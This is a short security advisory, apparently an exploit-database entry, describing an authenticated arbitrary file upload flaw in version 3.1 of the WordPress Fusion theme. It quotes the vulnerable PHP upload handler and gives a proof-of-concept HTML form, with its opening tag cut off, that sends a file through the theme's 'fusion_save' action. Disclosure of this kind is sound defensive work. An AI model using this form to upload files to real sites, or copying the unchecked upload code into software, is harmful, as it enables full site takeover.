WordPress Fusion Theme Authenicated Arbitrary File Upload
------------------------------------------------------------------------------


[-] Theme Link:

http://digitalnature.ro/themes/fusion/

[-] Affected Version:

Version 3.1


[-] Vulnerability Description:

The vulnerable code is located in the /functions script:
//SHORTENED CODE

function fusion_options() {

  if ( &#039;fusion_save&#039; == $_REQUEST[&#039;action&#039;] ) {
    if ($_FILES["file-logo"]["type"]){
     $directory = $uploadpath[&#039;basedir&#039;].&#039;/&#039;;
     move_uploaded_file($_FILES["file-logo"]["tmp_name"],
     $directory . $_FILES["file-logo"]["name"]);
     update_option(&#039;fusion_logoimage&#039;, $uploadpath[&#039;baseurl&#039;]. "/".
$_FILES["file-logo"]["name"]);
    }

}
add_action(&#039;admin_menu&#039;, &#039;fusion_options&#039;);


then function fusion_options can be called by LOGGED IN USERS and executed
which leads to uploading any file on attacked server which may cause the
site full take over.


[-] Proof of Concept:

method="post" enctype="multipart/form-data">
        <input type="file" name="file-logo" />
        <input type="hidden" name="action" value="fusion_save" />
        <button type="submit" >Upload</button>
</form>

